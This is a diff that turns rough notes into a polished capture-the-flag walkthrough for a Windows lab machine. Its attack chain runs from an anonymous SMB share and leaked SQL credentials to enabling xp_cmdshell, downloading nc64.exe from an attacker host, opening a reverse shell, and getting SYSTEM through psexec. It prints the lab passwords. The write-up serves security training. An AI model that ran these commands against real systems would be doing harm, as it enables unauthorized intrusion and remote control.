@@ -4,9 +4,10 @@
 #smb 
 #windows 
 #mssql
-#privescalation
 ### Reconnaissance
-`nmap -p- -sV $TARGET`
+The first phase of the penetration test involved reconnaissance to gather information about the target system. Nmap was used to scan the target system and identify open ports and services. The results showed that the system had several open ports, including SMB and MSSQL ports.
+
+The following commands were used for reconnaissance `nmap -sV -p- $TARGET`, here we have the original output:
 
 ```
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-21 15:15 CET
@@ -32,9 +33,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 91.49 seconds
 ```
 
-SMB ports are open
-
-we list smb with no passwd `smbclient -N -L ////${TARGET}//`
+### SMB Service
+We start by checking all the available shares on SMB, to do this we run  `smbclient -N -L ////${TARGET}//`
 ```
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -44,7 +44,7 @@ we list smb with no passwd `smbclient -N -L ////${TARGET}//`
 	IPC$            IPC       Remote IPC
 ```
 
-`smbclient  //${TARGET}/backups`
+After testing which of them allow us to enter without the need of a password we realize we can enter the backups share with the following command `smbclient  //${TARGET}/backups`
 
 ```
 smb: \> ls
@@ -57,10 +57,7 @@ smb: \> ls
 smb: \> get prod.dtsConfig
 getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1,3 KiloBytes/sec) (average 1,3 KiloBytes/sec)
 ```
-
-
-`cat prod.dtsConfig`
-
+We only see a file so we download it and check its contents `cat prod.dtsConfig`
 ```
 <DTSConfiguration>
     <DTSConfigurationHeading>
@@ -71,12 +68,12 @@ getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1,3 KiloBytes/sec) (
     </Configuration>
 </DTSConfiguration>%
 ```
-
+Inside this configurations we can find a user ID and the associated password.
 Password: `M3g4c0rp123`
 User ID: `ARCHETYPE/sql_svc`
+### MSSQL Protocol
 
-`impacket-mssqlclient ARCHETYPE/sql_svc@${TARGET}  -windows-auth`
-
+Now that we have MSSQL credentials, we can go inside the database to check the contents by running `impacket-mssqlclient ARCHETYPE/sql_svc@${TARGET}  -windows-auth`
 ```
 Password:
 [*] Encryption required, switching to TLS
@@ -88,8 +85,7 @@ Password:
 [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
 [!] Press help for extra shell commands
 ```
-Once in check the rol
-
+Once in check, we check the rol of the account we are currently using
 ```
 SQL> SELECT is_srvrolemember('sysadmin');
               
@@ -98,14 +94,14 @@ SQL> SELECT is_srvrolemember('sysadmin');
 
           1 
 ```
-
+Since we are admin we try to run cmd commands
 
 ```
 SQL> EXEC xp_cmdshell 'net user';
 [-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
 
 ```
-
+The current settings doesn't allow us to do so, but as we are admin we are allowed to change that setting.
 ```
 SQL> EXEC sp_configure 'show advanced options', 1;
 [*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
@@ -119,8 +115,7 @@ SQL> RECONFIGURE;
 
 ```
 
-Now we can run system commands
-
+Now we are able to run system commands
 ```
 SQL> xp_cmdshell "whoami"
 output                                                                             
@@ -132,12 +127,7 @@ archetype\sql_svc
 NULL 
 ```
 
-We download the nc64.exe utility to upload it to the server to get the reverse shell we want
-
-to upload it we
-
-`sudo python3 -m http.server 80`
-
+We download the nc64.exe utility to upload it to the server to get the reverse shell we want, to upload it we start a HTTP server with `sudo python3 -m http.server 80`
 ```
 SQL> xp_cmdshell "powershell -c pwd"
 output                                                                             
@@ -160,9 +150,7 @@ NULL
 
 
 ```
-
-Upload the nc64
-
+We need to save the exe in a folder where we are able to write so we choose the Downloads folder to download the nc64
 ```
 SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.169/nc64.exe -outfile nc64.exe"
 output                                                                             
@@ -171,35 +159,14 @@ output
 
 NULL
 ```
-
-
-we set listener
-
-```
-sudo nc -lvnp 443
-```
-
-we set connection
-```
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.169 443"
-```
+Before starting the reverse shell we start the local listener `sudo nc -lvnp 443`
+Once the listener is established we launch the connection `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.169 443"`
 
 Now with the reverse shell we can find the user flag in the user desktop
 
-
-
-priv escal
-
-download winpeas
-
-upload it as done before
-
-`sudo python3 -m http.server 80`
-
-`powershell -c wget http://10.10.14.169/winPEASx64.exe -outfile winPEASx64.exe`
-
-we run it  and
-
+### Privilege escalation
+One common way to search possible privilege escalation ways is the use of the automated tools LinPeas for Linux based systems and WinPeas for windows based systems, so we download WinPeas, to upload we can repeat the same steps done before running in local `sudo python3 -m http.server 80` and in the server `powershell -c wget http://10.10.14.169/winPEASx64.exe -outfile winPEASx64.exe`
+After executing the tool the following output is shown
 ```
 �����������������������������������͹ System Information �������������������������������������
 
@@ -255,18 +222,14 @@ we run it  and
     C:\Users\sql_svc\NTUSER.DAT
 ```
 
-Now we check the history located on `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+It seems that we can access the commands history located on `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
 ```
 more ConsoleHost_history.txt
 net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 exit
 ```
-
-
-
-`impacket-psexec administrator@${TARGET}`
-
+We found the administrator credentials so we login as so `impacket-psexec administrator@${TARGET}`
 ```
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -281,15 +244,13 @@ Password:
 Microsoft Windows [Version 10.0.17763.2061]
 (c) 2018 Microsoft Corporation. All rights reserved.
 ```
-
-Check priviledges
-
+Once inside we check the account 
 ```
 C:\Windows\system32>whoami
 nt authority\system
 ```
 
-Get flag
+The admin flag is inside the admin desktop
 
 ```
 C:\Users\Administrator\Desktop>more root.txt
